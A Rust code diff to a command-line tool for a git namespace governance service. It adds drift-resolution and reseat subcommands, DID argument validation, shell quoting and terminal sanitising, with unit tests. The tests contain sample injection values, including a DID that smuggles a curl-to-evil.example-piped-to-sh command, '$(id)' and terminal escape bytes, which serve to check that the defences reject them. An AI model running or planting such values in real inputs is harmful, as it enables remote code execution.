@@ -105,14 +105,150 @@ pub enum GitCommands {
         #[arg(long = "owner", required = true)]
         owners: Vec<String>,
     },
-    /// What this profile's DID may see (`git-ns/view`), or with `--admin`
-    /// every record and reason (admin session).
+    /// Answer drift the bridge reported on a repository (`git-ns/drift/resolve`).
+    Drift {
+        #[command(subcommand)]
+        command: DriftCommands,
+    },
+    /// Restore an admin to a headless namespace — one whose every
+    /// `git.ns.admin` left or lapsed. Community administrators only, and only
+    /// while the namespace is headless.
+    Reseat {
+        /// The namespace identifier (`namespace list`).
+        namespace: String,
+        /// The current member who receives `git.ns.admin`.
+        #[arg(long)]
+        subject: String,
+        /// Why the namespace is headless and why this member. Recorded as the
+        /// right's reason and shown to the namespace's repository owners.
+        #[arg(long)]
+        statement: String,
+    },
+    /// What this profile's DID may see (`git-ns/view`), with its linked forge
+    /// accounts, or with `--admin` every record and reason (admin session).
     View {
         #[arg(long)]
         resource: Option<String>,
         #[arg(long)]
         admin: bool,
     },
+}
+
+#[derive(Subcommand)]
+pub enum DriftCommands {
+    /// Adopt a forge-side role as a right, or have the bridge revert a
+    /// forge-side change. Read the item first with `git view --resource`.
+    Resolve {
+        /// `github.com/acme/widgets`.
+        resource: String,
+        #[arg(value_enum)]
+        action: DriftAction,
+        /// The item's type, as `git view` shows it.
+        #[arg(long = "type", value_enum)]
+        kind: DriftTypeArg,
+        /// For a role item: the forge account's id (not its login).
+        #[arg(long)]
+        account_id: Option<String>,
+        /// For a role item: the account's login, for display.
+        #[arg(long)]
+        account_login: Option<String>,
+        /// The item's `observed` value as you read it. Required to adopt: it
+        /// is refused if the forge now shows something else.
+        #[arg(long)]
+        observed: Option<String>,
+        #[arg(long)]
+        reason: Option<String>,
+    },
+}
+
+#[derive(Debug, Clone, Copy, ValueEnum)]
+pub enum DriftAction {
+    Adopt,
+    Revert,
+}
+
+#[derive(Debug, Clone, Copy, ValueEnum)]
+pub enum DriftTypeArg {
+    #[value(name = "roleAdded")]
+    RoleAdded,
+    #[value(name = "roleRemoved")]
+    RoleRemoved,
+    #[value(name = "roleChanged")]
+    RoleChanged,
+    #[value(name = "requiredCheckMissing")]
+    RequiredCheckMissing,
+    #[value(name = "protectionWeakened")]
+    ProtectionWeakened,
+    #[value(name = "bootstrapMissing")]
+    BootstrapMissing,
+}
+
+impl DriftTypeArg {
+    fn as_str(self) -> &'static str {
+        match self {
+            DriftTypeArg::RoleAdded => "roleAdded",
+            DriftTypeArg::RoleRemoved => "roleRemoved",
+            DriftTypeArg::RoleChanged => "roleChanged",
+            DriftTypeArg::RequiredCheckMissing => "requiredCheckMissing",
+            DriftTypeArg::ProtectionWeakened => "protectionWeakened",
+            DriftTypeArg::BootstrapMissing => "bootstrapMissing",
+        }
+    }
+
+    fn is_role(self) -> bool {
+        matches!(
+            self,
+            DriftTypeArg::RoleAdded | DriftTypeArg::RoleRemoved | DriftTypeArg::RoleChanged
+        )
+    }
+}
+
+/// The `git-ns/drift/resolve` payload for these arguments. The account's
+/// forge is the repository's; `login` is display only and defaults to the id.
+fn drift_payload(
+    resource: &str,
+    action: DriftAction,
+    kind: DriftTypeArg,
+    account_id: Option<String>,
+    account_login: Option<String>,
+    observed: Option<String>,
+    reason: Option<String>,
+) -> CliResult<Value> {
+    let resource = resource.to_lowercase();
+    let mut drift = json!({ "type": kind.as_str() });
+    match (kind.is_role(), account_id) {
+        (true, Some(id)) => {
+            let forge = resource.split('/').next().unwrap_or_default().to_string();
+            let login = account_login.unwrap_or_else(|| id.clone());
+            drift["account"] = json!({ "forge": forge, "id": id, "login": login });
+        }
+        (true, None) => {
+            return Err(format!(
+                "a `{}` item is selected by its account: pass --account-id",
+                kind.as_str()
+            )
+            .into());
+        }
+        (false, Some(_)) => {
+            return Err(format!("a `{}` item has no account", kind.as_str()).into());
+        }
+        (false, None) => {}
+    }
+    let action = match action {
+        DriftAction::Adopt => "adopt",
+        DriftAction::Revert => "revert",
+    };
+    if let Some(o) = observed {
+        drift["observed"] = json!(o);
+    } else if action == "adopt" {
+        return Err("adopting records a right derived from the observed role: pass --observed                     with the value `git view` showed"
+            .into());
+    }
+    let mut payload = json!({ "resource": resource, "drift": drift, "action": action });
+    if let Some(r) = reason {
+        payload["reason"] = json!(r);
+    }
+    Ok(payload)
 }
 
 #[derive(Subcommand)]
@@ -193,8 +329,45 @@ fn signing_key(keyring_key: &str) -> CliResult<(String, HolderKey)> {
 
 /// The fix for a refusal, where the operator's intent maps onto another
 /// command.
+/// A DID argument, checked as DID-core has it before anything is signed:
+/// what the VTC would refuse, and what could not be pasted safely, is caught
+/// here with the reason.
+fn did_arg(label: &str, value: &str) -> CliResult<String> {
+    vta_sdk::identifier::validate_did_core(label, value)?;
+    Ok(value.to_string())
+}
+
+/// `s` as one POSIX shell word: unchanged when it holds nothing a shell
+/// interprets, otherwise single-quoted. Every value this module puts into a
+/// command it prints goes through here, so a printed command can be pasted
+/// as it stands.
+fn shell_word(s: &str) -> String {
+    let plain = !s.is_empty()
+        && s.bytes().all(|b| {
+            b.is_ascii_alphanumeric()
+                || matches!(
+                    b,
+                    b'.' | b'_' | b'-' | b'/' | b':' | b'@' | b'%' | b'+' | b'=' | b','
+                )
+        });
+    if plain {
+        s.to_string()
+    } else {
+        format!("'{}'", s.replace('\'', "'\\''"))
+    }
+}
+
+/// Text from elsewhere (the VTC's refusal message, a DID) made safe to print
+/// to a terminal: control characters, escapes included, are shown as `?`.
+fn terminal_safe(s: &str) -> String {
+    s.chars()
+        .map(|c| if c.is_control() { '?' } else { c })
+        .collect()
+}
+
 fn guidance(code: &str, message: &str, did: &str) -> String {
-    let bin = bin_name();
+    let bin = shell_word(bin_name());
+    let (message, did) = (terminal_safe(message), terminal_safe(did));
     let hint = match code {
         "git-ns:lastOwner" => format!(
             "\nA repository always keeps an owner. Name another first:\n  {bin} git grant \
@@ -240,6 +413,24 @@ fn guidance(code: &str, message: &str, did: &str) -> String {
         "git-ns/right/revoke:notGranted" => "\nNothing to revoke: no live record matches. \
              Implied rights (an owner's commit right, an admin's ownership) are not records."
             .to_string(),
+        "git-ns/drift/resolve:driftNotFound" => format!(
+            "\nNo outstanding item matches — resolved already, or the forge changed since you \
+             read it. Read it again:\n  {bin} git view --resource <repository>"
+        ),
+        "git-ns/drift/resolve:notAdoptable"
+        | "git-ns/drift/resolve:accountNotLinked"
+        | "git-ns/drift/resolve:noMatchingRight" => format!(
+            "\nThis item records no right. Revert it instead:\n  {bin} git drift resolve \
+             <repository> revert --type <type> [--account-id <id>]"
+        ),
+        "git-ns/drift/resolve:notRevertible" => "\nThe bridge cannot undo this change: one \
+             that implements only git-ns/bridge/job 0.1 cannot take a role it does not manage \
+             off a repository. Remove it on the forge, or upgrade the bridge."
+            .to_string(),
+        "git-ns/namespace/reseat:notHeadless" => format!(
+            "\nThe namespace still has an admin; its admins grant git.ns.admin:\n  {bin} git \
+             grant --subject <did> --right git.ns.admin --resource <namespace>"
+        ),
         _ => String::new(),
     };
     format!("the community refused it ({code}): {message}{hint}")
@@ -370,6 +561,7 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             expires_in,
             reason,
         } => {
+            let subject = did_arg("--subject", &subject)?;
             let (did, key) = signing_key(keyring_key)?;
             let mut payload = json!({
                 "subject": subject,
@@ -398,6 +590,7 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             resource,
             reason,
         } => {
+            let subject = did_arg("--subject", &subject)?;
             let (did, key) = signing_key(keyring_key)?;
             let mut payload = json!({
                 "subject": subject,
@@ -459,6 +652,7 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             Ok(())
         }
         GitCommands::Transfer { resource, to } => {
+            let to = did_arg("--to", &to)?;
             let (did, key) = signing_key(keyring_key)?;
             let resp = anon()
                 .git_ns_transfer(&resource.to_lowercase(), &to, &key)
@@ -475,6 +669,9 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             show(&resp)
         }
         GitCommands::Adopt { resource, owners } => {
+            for o in &owners {
+                did_arg("--owner", o)?;
+            }
             let (did, key) = signing_key(keyring_key)?;
             let resp = anon()
                 .git_ns_adopt(&resource.to_lowercase(), &owners, &key)
@@ -490,7 +687,50 @@ pub async fn run(command: GitCommands, keyring_key: &str, target: &VtcTarget) ->
             }
             let (did, key) = signing_key(keyring_key)?;
             let resp = anon()
-                .git_ns_view(resource.as_deref(), &key)
+                .git_ns_view_v2(resource.as_deref(), &key)
+                .await
+                .map_err(|e| explain(e, &did))?;
+            show(&resp)
+        }
+        GitCommands::Drift {
+            command:
+                DriftCommands::Resolve {
+                    resource,
+                    action,
+                    kind,
+                    account_id,
+                    account_login,
+                    observed,
+                    reason,
+                },
+        } => {
+            let (did, key) = signing_key(keyring_key)?;
+            let payload = drift_payload(
+                &resource,
+                action,
+                kind,
+                account_id,
+                account_login,
+                observed,
+                reason,
+            )?;
+            let payload: specs::drift::resolve::v0_1::Payload = serde_json::from_value(payload)
+                .map_err(|e| format!("that resolution is not well formed: {e}"))?;
+            let resp = anon()
+                .git_ns_drift_resolve(&payload, &key)
+                .await
+                .map_err(|e| explain(e, &did))?;
+            show(&resp)
+        }
+        GitCommands::Reseat {
+            namespace,
+            subject,
+            statement,
+        } => {
+            let subject = did_arg("--subject", &subject)?;
+            let (did, key) = signing_key(keyring_key)?;
+            let resp = anon()
+                .git_ns_reseat(&namespace, &subject, &statement, &key)
                 .await
                 .map_err(|e| explain(e, &did))?;
             show(&resp)
@@ -550,6 +790,106 @@ mod tests {
     fn a_last_owner_refusal_names_the_grant_that_resolves_it() {
         let g = guidance("git-ns:lastOwner", "last owner", "did:key:z");
         assert!(g.contains("--right git.repo.own"), "{g}");
+    }
+
+    #[test]
+    fn drift_resolve_arguments_become_the_specifications_selector() {
+        let p = drift_payload(
+            "GitHub.com/Acme/Widgets",
+            DriftAction::Revert,
+            DriftTypeArg::RoleAdded,
+            Some("5550123".into()),
+            Some("eve-dev".into()),
+            Some("write".into()),
+            None,
+        )
+        .unwrap();
+        assert_eq!(
+            p,
+            json!({
+                "resource": "github.com/acme/widgets",
+                "action": "revert",
+                "drift": {
+                    "type": "roleAdded",
+                    "account": { "forge": "github.com", "id": "5550123", "login": "eve-dev" },
+                    "observed": "write"
+                }
+            })
+        );
+        let _: specs::drift::resolve::v0_1::Payload = serde_json::from_value(p).unwrap();
+        // A role item needs its account; a protection item has none; adopt
+        // needs what was observed.
+        assert!(
+            drift_payload(
+                "github.com/a/b",
+                DriftAction::Revert,
+                DriftTypeArg::RoleAdded,
+                None,
+                None,
+                None,
+                None
+            )
+            .is_err()
+        );
+        assert!(
+            drift_payload(
+                "github.com/a/b",
+                DriftAction::Revert,
+                DriftTypeArg::BootstrapMissing,
+                Some("1".into()),
+                None,
+                None,
+                None
+            )
+            .is_err()
+        );
+        assert!(
+            drift_payload(
+                "github.com/a/b",
+                DriftAction::Adopt,
+                DriftTypeArg::RoleChanged,
+                Some("1".into()),
+                None,
+                None,
+                None
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn a_not_revertible_refusal_explains_the_bridge_version() {
+        let g = guidance("git-ns/drift/resolve:notRevertible", "refused", "did:key:z");
+        assert!(g.contains("bridge/job 0.1"), "{g}");
+    }
+
+    #[test]
+    fn a_did_argument_that_is_not_did_core_is_refused_before_signing() {
+        for bad in [
+            "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
+            "did:web:x;id",
+            "did:web:x y",
+            "did:web:x#k-1",
+        ] {
+            assert!(did_arg("--subject", bad).is_err(), "{bad}");
+        }
+        assert!(did_arg("--subject", "did:webvh:QmScid:acme-vtc.example:bob").is_ok());
+    }
+
+    #[test]
+    fn printed_commands_quote_what_a_shell_would_interpret() {
+        assert_eq!(shell_word("cnm"), "cnm");
+        assert_eq!(
+            shell_word("did:webvh:QmScid:acme.example"),
+            "did:webvh:QmScid:acme.example"
+        );
+        assert_eq!(shell_word("a b"), "'a b'");
+        assert_eq!(shell_word("$(id)"), "'$(id)'");
+        assert_eq!(shell_word("it's"), "'it'\\''s'");
+        assert_eq!(shell_word(""), "''");
+        // A refusal's text reaches the terminal without its control bytes.
+        let g = guidance("git-ns:lastOwner", "evil\u{1b}[2Jmsg", "did:key:z\u{7}");
+        assert!(!g.chars().any(|c| c.is_control() && c != '\n'), "{g:?}");
     }
 
     #[test]
